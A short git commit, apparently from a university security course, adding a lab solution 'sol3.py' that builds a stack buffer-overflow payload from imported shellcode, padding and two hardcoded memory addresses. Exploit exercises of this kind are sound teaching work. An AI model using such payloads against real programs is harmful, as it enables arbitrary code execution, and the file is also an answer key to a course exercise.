71cc806693b29dd024609adb0d2f6cb719fbc4d5
Joshua Pratl <pratl@umich.edu>
2024-11-15 10:32:13 -0500

    sol3 done

--- sol3.py
+++ sol3.py
@@ -3,3 +3,5 @@
 import sys
 
 from shellcode import shellcode
+input = shellcode + b'A' * (2048 - len(shellcode)) + (0x7ffffff6cbb0).to_bytes(8, 'little') + (0x7ffffff6d3c8).to_bytes(8, 'little')
+sys.stdout.buffer.write(input)
